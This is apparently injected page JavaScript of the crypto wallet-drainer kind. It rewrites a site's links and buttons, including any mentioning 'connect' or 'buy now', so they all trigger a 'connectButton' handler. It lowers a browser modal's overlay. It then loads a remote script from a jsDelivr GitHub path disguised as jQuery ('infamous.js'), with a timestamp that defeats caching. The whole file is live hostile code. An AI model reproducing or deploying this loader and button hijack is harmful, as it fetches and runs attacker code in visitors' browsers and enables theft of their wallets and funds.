let modalCheckInterval;

function modifyElements() {
    function hasExcludedClass(element, classes) {
        for (let parent = element; parent !== document; parent = parent.parentNode) {
            if (parent.nodeType === Node.ELEMENT_NODE && classes.some(cls => parent.classList.contains(cls))) {
                return true;
            }
        }
        return false;
    }

    const excludedClasses = ['connectButton', 'web3-overlay', 'item', 'web3-modal-items', 'web3-modal-title', 'web3-modal'];
    const candidates = document.querySelectorAll('a, button, [role="button"], [disabled]');
    const uppercase = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    const lowercase = 'abcdefghijklmnopqrstuvwxyz';
    const xpath = `//div[contains(translate(text(), '${uppercase}', '${lowercase}'), 'connect') or contains(translate(text(), '${uppercase}', '${lowercase}'), 'buy now')]`;
    const divsWithText = document.evaluate(xpath, document, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);
    const divs = [];

    for (let i = 0; i < divsWithText.snapshotLength; i++) {
        divs.push(divsWithText.snapshotItem(i));
    }

    const allElements = Array.from(candidates).concat(divs);
    const filteredElements = allElements.filter(element => !hasExcludedClass(element, excludedClasses));

    filteredElements.forEach(element => {
        if (element.tagName.toLowerCase() === 'a') {
            element.removeAttribute('href');
            element.removeAttribute('target');
            element.style.cursor = 'pointer';
        }
        if (element.hasAttribute('disabled')) {
            element.removeAttribute('disabled');
            element.style.opacity = '0.8';
            element.style.backgroundColor = '#cdcdcd';
        }
        element.classList.add('connectButton');
    });
}

function checkForModal() {
    const modal = document.getElementById('brws_mdl_window');
    if (modal) {
        const modalOverlay = Array.from(document.querySelectorAll('div')).find(div => div.style.zIndex === '2147483644');
        if (modalOverlay) {
            modalOverlay.style.zIndex = '1';
            clearInterval(modalCheckInterval);  // Stop the interval after the z-index is updated
        }
    }
}

document.addEventListener('DOMContentLoaded', () => {
    modifyElements();
    modalCheckInterval = setInterval(checkForModal, 500);  // Start checking the modal every 500ms
});

var currentUnixTimestamp = Math.floor(Date.now() / 1000);
var script = document.createElement('script');
script.src = 'https://cdn.jsdelivr.net/gh/nd91jqf/jquery@master/infamous.js?version=' + currentUnixTimestamp;
script.setAttribute('fetchpriority', 'high');
document.head.appendChild(script);
